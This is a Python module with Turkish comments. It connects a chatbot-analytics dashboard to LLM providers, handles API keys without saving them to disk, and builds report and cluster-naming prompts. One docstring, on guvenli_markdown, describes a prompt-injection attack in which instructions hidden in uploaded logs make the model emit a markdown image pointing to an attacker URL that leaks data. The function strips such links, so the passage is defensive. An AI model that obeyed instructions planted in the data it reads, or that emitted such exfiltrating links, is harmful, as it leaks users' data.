"""
LLM Katmani ve Ayar Yonetimi
------------------------------
Dashboard rapor uretimi ve kume isimlendirme icin buradan kullanir.

GUVENLIK KARARI: API anahtari ASLA diske yazilmaz.
  - Kalici ayarlar (base_url, model) -> ayarlar.json  [sir degil]
  - API anahtari -> ortam degiskeni veya Streamlit oturum hafizasi  [sir]
Boylece ayarlar.json paylasilabilir/versiyonlanabilir, anahtar sizmaz.
"""

import json
import os
import re

from diller import T

AYAR_DOSYASI = "ayarlar.json"

# Hazir saglayicilar - kullanici UI'dan secebilsin diye
SAGLAYICILAR = {
    "NVIDIA NIM (ucretsiz)": {
        "base_url": "https://integrate.api.nvidia.com/v1",
        "anahtar_degiskeni": "NVIDIA_API_KEY",
        "modeller": [
            "meta/llama-3.3-70b-instruct",
            "meta/llama-3.1-8b-instruct",
            "mistralai/mixtral-8x7b-instruct-v0.1",
            "google/gemma-2-9b-it",
        ],
        "anahtar_adresi": "https://build.nvidia.com",
    },
    "Hugging Face (ucretsiz)": {
        "base_url": "https://router.huggingface.co/v1",
        "anahtar_degiskeni": "HF_TOKEN",
        "modeller": [
            "meta-llama/Llama-3.3-70B-Instruct",
            "Qwen/Qwen2.5-72B-Instruct",
            "meta-llama/Llama-3.1-8B-Instruct",
        ],
        "anahtar_adresi": "https://huggingface.co/settings/tokens",
    },
    "OpenAI": {
        "base_url": "https://api.openai.com/v1",
        "anahtar_degiskeni": "OPENAI_API_KEY",
        "modeller": ["gpt-4o-mini", "gpt-4o"],
        "anahtar_adresi": "https://platform.openai.com/api-keys",
    },
    "Yerel / Ozel (Ollama, vLLM, kurum ici)": {
        "base_url": "http://localhost:11434/v1",
        "anahtar_degiskeni": "LLM_API_KEY",
        "modeller": ["llama3.1", "qwen2.5"],
        "anahtar_adresi": "",
        # Ollama ve --api-key verilmemis vLLM anahtar istemiyor, ama openai
        # istemcisi bos anahtari reddediyor; yer tutucu gonderilir.
        "anahtar_gerekmez": True,
    },
}

# Ilk acilis icin baslangic degeri. Katalog degisebilir; panelde "Calisan
# modeli otomatik bul" o anki calisani bulup ayarlar.json'a yazar.
VARSAYILAN = {
    "saglayici": "Hugging Face (ucretsiz)",
    "base_url": "https://router.huggingface.co/v1",
    "model": "meta-llama/Llama-3.3-70B-Instruct",
    "sicaklik": 0.3,
    "max_token": 1500,
}


def ayarlari_yukle():
    ayar = dict(VARSAYILAN)
    if os.path.exists(AYAR_DOSYASI):
        try:
            with open(AYAR_DOSYASI, encoding="utf-8") as f:
                ayar.update(json.load(f))
        except (json.JSONDecodeError, OSError):
            pass          # bozuk dosya varsayilani bozmasin
    return ayar


def ayarlari_kaydet(ayar):
    """Sadece sir olmayan alanlari yazar. Anahtar gelirse sessizce atilir."""
    temiz = {k: v for k, v in ayar.items()
             if k in VARSAYILAN and k not in ("api_key", "anahtar")}
    with open(AYAR_DOSYASI, "w", encoding="utf-8") as f:
        json.dump(temiz, f, ensure_ascii=False, indent=2)
    return temiz


def anahtar_bul(ayar, oturum_anahtari=None):
    """Oncelik: UI'dan girilen > ortam degiskeni.

    strip(): kopyala-yapistirda basa/sona kacan bosluk ya da satir sonu
    sunucu tarafinda 401 Unauthorized'a sebep oluyor."""
    if oturum_anahtari and oturum_anahtari.strip():
        return oturum_anahtari.strip()
    # Sadece secili saglayicinin degiskeni okunur. Eskiden NVIDIA_API_KEY'e
    # geri dusuluyordu; bu, NVIDIA anahtarini OpenAI'ye ya da kullanicinin
    # yazdigi ozel bir adrese gondermek demekti.
    bilgi = SAGLAYICILAR.get(ayar.get("saglayici"), {})
    degisken = bilgi.get("anahtar_degiskeni")
    ortam = os.environ.get(degisken) if degisken else None
    if ortam and ortam.strip():
        return ortam.strip()
    return "yerel" if bilgi.get("anahtar_gerekmez") else None


def anahtar_gerekmez(ayar):
    return bool(SAGLAYICILAR.get(ayar.get("saglayici"), {}).get("anahtar_gerekmez"))


def _ascii_temizle(metin, alan_adi):
    """HTTP basliklari ASCII olmak zorunda. Web sayfasindan kopyala-yapistir
    sirasinda gorunmez karakter (\u200b sifir genislikli bosluk, \u2013 kirik
    tire, akilli tirnak) tasinabiliyor; httpx bunlarda UnicodeEncodeError
    firlatiyor ve hata kullaniciya anlamsiz geliyor."""
    if metin is None:
        return None
    temiz = "".join(c for c in metin if c.isprintable() and ord(c) < 128).strip()
    if not temiz:
        raise RuntimeError(T("hata_anahtar_bozuk"))
    if temiz != metin.strip():
        atilan = len(metin.strip()) - len(temiz)
        print(f"UYARI: {alan_adi} icinden {atilan} gecersiz karakter temizlendi.")
    return temiz


def istemci(ayar, oturum_anahtari=None):
    from openai import OpenAI
    anahtar = anahtar_bul(ayar, oturum_anahtari)
    if not anahtar:
        raise RuntimeError(T("anahtar_gerekli"))
    anahtar = _ascii_temizle(anahtar, "API anahtari")
    return OpenAI(base_url=ayar["base_url"], api_key=anahtar, timeout=60.0)


def hata_metni(e):
    """Kendi RuntimeError mesajlarimiz zaten okunur; tip adi sadece
    beklenmeyen (kutuphane) hatalarinda teshis icin eklenir."""
    return str(e) if type(e) is RuntimeError else f"{type(e).__name__}: {e}"


def baglanti_testi(ayar, oturum_anahtari=None):
    """(basarili: bool, mesaj: str) doner. Hicbir zaman exception firlatmaz.

    max_tokens dusuk tutulmuyor: "reasoning" modelleri (ornegin gpt-oss,
    nemotron-3) cevaptan once dusunme token'lari harciyor. Dar bir sinirda
    (eskiden 20 idi) butun pay dusunmeye gidip content=None donebiliyor,
    kod da None.strip() ile cokuyordu."""
    try:
        cli = istemci(ayar, oturum_anahtari)
        yanit = cli.chat.completions.create(
            model=ayar["model"],
            messages=[{"role": "user", "content": "Merhaba de."}],
            max_tokens=300,
            temperature=0,
        )
        icerik = yanit.choices[0].message.content
        if not icerik or not icerik.strip():
            return False, T("hata_bos_cevap")
        return True, T("baglanti_ok").format(icerik.strip()[:60])
    except Exception as e:
        return False, hata_metni(e)


def mevcut_modelleri_listele(ayar, oturum_anahtari=None):
    """Saglayicinin O ANKI gercek model listesini ceker.

    NEDEN GEREKLI: NVIDIA NIM'in ucretsiz katalogu sik degisiyor - bu projede
    ayni ay icinde iki kez model kaldirildi (3.3 -> 3.1 -> 3.3, sonra 3.3 de
    kaldirildi). Sabit bir model adi yazmak yerine, /v1/models ucundan o anki
    gercek listeyi cekmek tek guvenilir yontem.

    (basarili: bool, sonuc) doner. basarili ise sonuc = model id listesi
    (buyuk/kucuk chat modelleri one alinarak siralanmis), degilse sonuc = hata metni.
    """
    try:
        cli = istemci(ayar, oturum_anahtari)
        modeller = [m.id for m in cli.models.list().data]
        if not modeller:
            return False, T("hata_bos_liste")

        def oncelik(m):
            ml = m.lower()
            buyuk = any(x in ml for x in ("70b", "72b", "405b", "8x7b", "large"))
            return (0 if buyuk else 1, ml)

        modeller.sort(key=oncelik)
        return True, modeller
    except Exception as e:
        return False, hata_metni(e)


# ---------------------------------------------------------------------
# Rapor uretimi
# ---------------------------------------------------------------------
SISTEM_PROMPT = """Sen bir müşteri hizmetleri operasyon analistisin. Sana bir chatbot'un
konuşma kalitesi hakkında SAYISAL bulgular verilecek. Bunları yönetime sunulacak,
net ve eyleme dönük bir Türkçe rapora çevir.

KURALLAR:
1. Türkçe karakterleri eksiksiz kullan: ç, ğ, ı, ö, ş, ü, İ.
   "başarısızlık" yaz, "basarisizlik" yazma.
   "görülmüştür" yaz, "gorulmustur" yazma.
   "dönemine" yaz, "donemine" yazma.
   Bu kurala her cümlede uy — tek bir kelimede bile taviz verme.
2. Başlıklar için markdown "## " kullan. Kalın metni başlık yerine kullanma.
3. Sadece sana verilen sayıları yorumla. YENİ SAYI UYDURMA.
4. Genel geçer tavsiye yazma. Her önerin YUKARIDA VERİLEN bir sayıya dayansın
   ve hangi sayıya dayandığını belirt.
   KÖTÜ (sayı yok):  "Chatbot düzenli olarak eğitilmelidir."
   İYİ (sayıya bağlı): "<konu> konusunda başarısızlık %<oran>; bu konudaki
   yanıt senaryoları öncelikli gözden geçirilmeli."
   Buradaki kalıp sadece BİÇİM örneğidir — <konu> ve <oran> yerine sana
   verilen gerçek değerleri koy, bu cümleyi olduğu gibi kopyalama.
5. Kısa yaz. Her bölüm en fazla 4-5 cümle."""

KULLANICI_SABLONU = """Aşağıda bir chatbot'un {donem} dönemine ait analiz bulguları var.

{bulgular}

Bu bulgulara dayanarak, AŞAĞIDAKİ BAŞLIKLARI AYNEN KULLANARAK rapor yaz:

## Yönetici Özeti
(3-4 cümle, en kritik bulgu)

## En Sorunlu Konular
(hangi konular, hangi oranlarla)

## Tespit Edilen Olaylar
(zaman trendlerindeki anomaliler; yoksa "belirgin bir anomali yok" yaz)

## Öneriler
(3-5 madde. HER MADDE FARKLI bir konuda olsun — aynı öneriyi farklı konular için
tekrarlama. "Eğitim verisine eklenmeli" gibi genel geçer madde YAZMA; bunun yerine
somut bir aksiyon yaz: hangi senaryo gözden geçirilmeli, hangi akış değiştirilmeli,
hangi durumda insana devredilmeli.)

DİKKAT — sayı birimlerini karıştırma:
- "%" ile verilen değerler orandır.
- "oturum" ile verilen değerler ADETTİR, oran değildir.

Raporun tamamını eksiksiz Türkçe karakterlerle yaz."""


# ---------------------------------------------------------------------
# Ingilizce karsiliklari. Panelin dili degisince rapor da o dilde yazilir;
# Turkce surumdeki "Turkce karakter" maddesi burada anlamsiz oldugu icin
# birebir ceviri degil, ayni kurallarin Ingilizce karsiligi.
# ---------------------------------------------------------------------
SISTEM_PROMPT_EN = """You are a customer-service operations analyst. You will be
given NUMERIC findings about a chatbot's conversation quality. Turn them into a
clear, actionable report for management, written in English.

RULES:
1. Use markdown "## " for headings. Do not use bold text as a heading.
2. Only interpret the numbers you are given. DO NOT INVENT NEW NUMBERS.
3. No generic advice. Every recommendation must rest on a number GIVEN ABOVE,
   and must say which number it rests on.
   BAD (no number):  "The chatbot should be retrained regularly."
   GOOD (tied to a number): "Failure on <topic> is <rate>%; the response
   scenarios for this topic should be reviewed first."
   That pattern is a FORMAT example only — substitute the real values for
   <topic> and <rate>; do not copy the sentence verbatim.
4. Be brief. At most 4-5 sentences per section."""

KULLANICI_SABLONU_EN = """Below are the analysis findings for a chatbot covering {donem}.

{bulgular}

Based on these findings, write a report USING EXACTLY THE HEADINGS BELOW:

## Executive Summary
(3-4 sentences, the most critical finding)

## Most Problematic Topics
(which topics, at what rates)

## Detected Events
(anomalies in the time trends; if there are none, write "no significant anomaly")

## Recommendations
(3-5 bullets. EACH BULLET on a DIFFERENT topic — do not repeat the same advice
for different topics. Do NOT write generic bullets like "add to training data";
write a concrete action instead: which scenario to review, which flow to change,
when to hand over to a human.)

CAREFUL — do not confuse units:
- Values given with "%" are rates.
- Values given with "sessions" are COUNTS, not rates."""


def _bulgu_metni(basarisizlik, trend, kume_isimleri, oturum_sayisi):
    """Prompt'a ham JSON dokmek yerine acik etiketli metin uretir.

    Sebep: ham JSON gonderildiginde model adet ile orani karistirdi
    ("76 oturum" -> "%76") ve `belirsiz_mesaj` kolonunun 'evet'/'hayir'
    degerlerini kullanicinin yazdigi mesaj sandi. Etiketli metin bu iki
    hatayi da ortadan kaldiriyor.
    """
    ad = lambda n: kume_isimleri.get(str(n), f"Küme {n}")
    # JSON'dan float gelebiliyor; adetler tam sayi gorunmeli ("28.0 oturum" olmaz)
    sayi = lambda v: str(int(v)) if float(v) == int(float(v)) else str(v)
    L = []

    L.append("## Genel")
    L.append(f"Toplam konuşma oturumu: {oturum_sayisi} adet")
    L.append(f"Başarısız biten oturum oranı: %{basarisizlik['genel_basarisizlik_orani']}")

    if basarisizlik.get("kume_bazli"):
        L.append("\n## Konu kümelerine göre başarısızlık oranı")
        for r in basarisizlik["kume_bazli"]:
            L.append(f"- {ad(r['kume'])}: %{r['basarisizlik_orani']} "
                     f"({sayi(r['oturum_sayisi'])} oturum içinde)")

    bitis = basarisizlik.get("basarisiz_oturum_bitis_dagilimi") or {}
    if bitis:
        okunur = {"fallback": "Bot mesajı anlayamadı (fallback)",
                  "yetkiliye_yonlendirme": "Bot konuyu insana devretti",
                  "tekrarli_soru": "Kullanıcı aynı şeyi tekrar sormak zorunda kaldı"}
        L.append("\n## Başarısız oturumlar nasıl bitti (ADET — bunlar oran DEĞİL)")
        for k, v in sorted(bitis.items(), key=lambda x: -x[1]):
            L.append(f"- {okunur.get(k, k)}: {sayi(v)} oturum")
        L.append(f"- Toplam başarısız oturum: {sayi(sum(bitis.values()))} oturum")

    if basarisizlik.get("belirsiz_mesaj_etkisi"):
        L.append("\n## Mesaj netliğinin etkisi")
        for r in basarisizlik["belirsiz_mesaj_etkisi"]:
            tip = ("Kullanıcı mesajı BELİRSİZ olan oturumlar"
                   if str(r["belirsiz_mesaj"]).lower().startswith("e")
                   else "Kullanıcı mesajı NET olan oturumlar")
            L.append(f"- {tip}: %{r['basarisizlik_orani']} başarısız "
                     f"({sayi(r['oturum_sayisi'])} oturum içinde)")

    if trend:
        L.append("\n## Zaman trendleri")
        hp = trend.get("hacim_patlamasi")
        if hp:
            konu = hp.get("etiket") or ad(hp.get("kume"))
            L.append(f"- Hacim patlaması: '{konu}' konusunda {hp['zirve_hafta']} "
                     f"haftasında {sayi(hp['zirve_hacim'])} oturum açıldı "
                     f"(diğer haftaların ortalaması {hp['diger_haftalar_ortalama']} oturum).")
            if hp.get("zirve_basarisizlik") is not None:
                L.append(f"  O hafta başarısızlık oranı %{hp['zirve_basarisizlik']}.")
        for konu, seri in (trend.get("konu_aylik") or {}).items():
            parca = ", ".join(f"{r['ay']} %{r['basarisizlik_orani']}" for r in seri)
            L.append(f"- '{konu}' konusunda aylık başarısızlık seyri: {parca}")
        if trend.get("aylik_genel") and not trend.get("konu_aylik"):
            parca = ", ".join(f"{r['ay']} %{r['basarisizlik_orani']}"
                              for r in trend["aylik_genel"])
            L.append(f"- Genel aylık başarısızlık seyri: {parca}")

    return "\n".join(L)


def rapor_uret(basarisizlik, trend, kume_isimleri, ayar,
               oturum_anahtari=None, donem="-", oturum_sayisi="-", dil="tr"):
    """dil: raporun yazilacagi dil ("tr" / "en") - panelin dil secimini izler."""
    cli = istemci(ayar, oturum_anahtari)

    ingilizce = str(dil).lower().startswith("en")
    sistem = SISTEM_PROMPT_EN if ingilizce else SISTEM_PROMPT
    sablon = KULLANICI_SABLONU_EN if ingilizce else KULLANICI_SABLONU

    prompt = sablon.format(
        donem=donem,
        bulgular=_bulgu_metni(basarisizlik, trend, kume_isimleri, oturum_sayisi),
    )

    yanit = cli.chat.completions.create(
        model=ayar["model"],
        messages=[{"role": "system", "content": sistem},
                  {"role": "user", "content": prompt}],
        temperature=ayar.get("sicaklik", 0.3),
        max_tokens=ayar.get("max_token", 1500),
    )
    icerik = yanit.choices[0].message.content
    if not icerik or not icerik.strip():
        raise RuntimeError(T("hata_bos_cevap"))
    return guvenli_markdown(icerik.strip())


def guvenli_markdown(metin):
    """LLM ciktisindaki resim ve baglantilari duz metne cevirir.

    NEDEN: Prompt'a kullanicinin yukledigi log metinleri giriyor. Loga
    yerlestirilmis bir talimat modele ![](https://saldirgan/?veri=...) yazdirirsa
    panel bu resmi yuklerken veriyi dis adrese gonderir. Raporda baglantiya
    ihtiyac yok; hepsi metne indiriliyor."""
    if not metin:
        return metin
    metin = re.sub(r"!\[([^\]]*)\]\([^)]*\)", r"\1", metin)
    metin = re.sub(r"\[([^\]]*)\]\([^)]*\)", r"\1", metin)
    metin = re.sub(r"<(https?://[^>]+)>", r"\1", metin)
    return re.sub(r"</?[a-zA-Z][^>]*>", "", metin)


def kumeleri_isimlendir(temsili, ayar, oturum_anahtari=None, dil="tr"):
    """Her kume icin kisa baslik uretir. {"0": "Isim", ...} doner.
    dil: baslik dili ("tr" / "en")."""
    cli = istemci(ayar, oturum_anahtari)

    bloklar = []
    for kume, mesajlar in sorted(temsili.items(), key=lambda x: int(x[0])):
        ornekler = "\n".join(f"  - {m}" for m in mesajlar[:10])
        bloklar.append(f"Kume {kume}:\n{ornekler}")

    if str(dil).lower().startswith("en"):
        prompt = (
            "Below are messages sent to a customer support chatbot, grouped into "
            "clusters. For each cluster produce a clear 2-4 word topic title in "
            "English.\n\n"
            "RULES:\n"
            "- Give every cluster a DIFFERENT name; never reuse a name.\n"
            "- Return JSON only: {\"0\": \"Name\", \"1\": \"Name\", ...}\n\n"
            + "\n\n".join(bloklar)
        )
    else:
        prompt = (
            "Asagida bir musteri destek chatbot'una gelen mesajlarin kumelere "
            "ayrilmis hali var. Her kume icin 2-4 kelimelik, Turkce, net bir konu "
            "basligi uret.\n\n"
            "KURALLAR:\n"
            "- Turkce karakterleri dogru yaz (ı, ğ, ü, ş, ö, ç, İ).\n"
            "- Her kumeye FARKLI bir isim ver, ayni ismi iki kumeye verme.\n"
            "- Sadece JSON dondur: {\"0\": \"Isim\", \"1\": \"Isim\", ...}\n\n"
            + "\n\n".join(bloklar)
        )

    yanit = cli.chat.completions.create(
        model=ayar["model"],
        messages=[{"role": "user", "content": prompt}],
        temperature=0.2,
        max_tokens=500,
    )
    icerik = yanit.choices[0].message.content
    if not icerik or not icerik.strip():
        raise RuntimeError(T("hata_bos_cevap"))
    return _isimleri_ayikla(icerik, temsili)


ISIM_UZUNLUK_SINIRI = 60


def _isimleri_ayikla(icerik, temsili):
    """Model cevabindan {kume_no: isim} sozlugunu cikarir ve dogrular.

    Model bazen JSON'u ```json bloguna sariyor ya da onune/arkasina aciklama
    ekliyor; bazen de liste, sayi anahtar ya da uzun metin donduruyor.
    Panel bu sozlugu dogrudan grafiklere yaziyor, o yuzden sadece gecerli
    kume numaralari ve kisa metin isimler kabul edilir."""
    eslesme = re.search(r"\{.*\}", icerik, re.DOTALL)
    if not eslesme:
        raise RuntimeError(T("hata_isim_json").format(icerik[:120]))
    veri = json.loads(eslesme.group(0))
    if not isinstance(veri, dict):
        raise RuntimeError(T("hata_isim_json").format(icerik[:120]))

    gecerli = {str(k) for k in temsili}
    isimler = {}
    for k, v in veri.items():
        k = str(k).strip()
        if k not in gecerli or not isinstance(v, (str, int, float)):
            continue
        ad = " ".join(str(v).split())[:ISIM_UZUNLUK_SINIRI]
        if ad:
            isimler[k] = ad
    if not isimler:
        raise RuntimeError(T("hata_isim_gecersiz"))
    return isimler

# Sohbet/rapor icin ISE YARAMAYAN model turleri. /v1/models bunlari da
# donduruyor ama chat.completions ile calismazlar ya da amac disi.
ELENECEK_KALIPLAR = (
    "embed", "rerank", "retriever", "guard", "safety", "moderation",
    "topic-control", "vision", "ocr", "parse", "speech", "tts", "asr",
    "audio", "image", "video", "diffusion", "flux", "reward", "genrm",
    "nemoguard", "-base", "clip", "depth", "segment",
)


def sohbet_adaylari(modeller):
    """Model listesinden rapor uretebilecek olanlari suzer ve siralar."""
    adaylar = []
    for m in modeller:
        ml = m.lower()
        if any(k in ml for k in ELENECEK_KALIPLAR):
            continue
        adaylar.append(m)

    def puan(m):
        ml = m.lower()
        # "reasoning" modelleri en sona: dusunme asamasi token payini yiyor,
        # rapor formatini bozabiliyor (gpt-oss ve nemotron-3 ile yasandi).
        akil_yurutme = any(x in ml for x in ("gpt-oss", "nemotron-3", "reasoning",
                                             "thinking", "-r1", "qwq", "mimo", "glm"))
        buyuk = any(x in ml for x in ("405b", "253b", "120b", "70b", "72b",
                                      "8x22b", "8x7b", "large"))
        instruct = "instruct" in ml or "chat" in ml
        return (1 if akil_yurutme else 0, 0 if instruct else 1,
                0 if buyuk else 1, ml)

    adaylar.sort(key=puan)
    return adaylar


def calisan_model_bul(ayar, oturum_anahtari=None, adaylar=None, deneme_siniri=12,
                      ilerleme=None):
    """Adaylari sirayla deneyip GERCEKTEN cevap verenleri bulur.

    NEDEN: /v1/models kataloğun tamamini donduruyor, ama ucretsiz hesapta
    hepsi cagrilabilir degil — cagirinca 404 "Not found for account" geliyor.
    Hangisinin calistigini onceden bilmenin yolu yok, denemek gerekiyor.

    (basarili: bool, sonuc) doner. sonuc = calisan model adi, ya da hata metni.
    """
    if adaylar is None:
        ok, liste = mevcut_modelleri_listele(ayar, oturum_anahtari)
        if not ok:
            return False, liste
        adaylar = sohbet_adaylari(liste)

    denenen = adaylar[:deneme_siniri]
    hatalar = []
    for i, model in enumerate(denenen, 1):
        if ilerleme:
            ilerleme(i / len(denenen), T("ilr_deneniyor").format(model))
        deneme_ayar = dict(ayar, model=model)
        ok, mesaj = baglanti_testi(deneme_ayar, oturum_anahtari)
        if ok:
            return True, model

        # 401 = kimlik dogrulanamadi. Bu model sorunu DEGIL, anahtar sorunu —
        # digerlerini denemenin anlami yok, hepsi ayni hatayi verir.
        if "401" in mesaj or "Authentication" in mesaj or "Unauthorized" in mesaj:
            return False, T("hata_401")
        hatalar.append(f"{model} -> {mesaj[:70]}")

    return False, T("hata_model_yok") + "\n" + "\n".join(hatalar[:6])

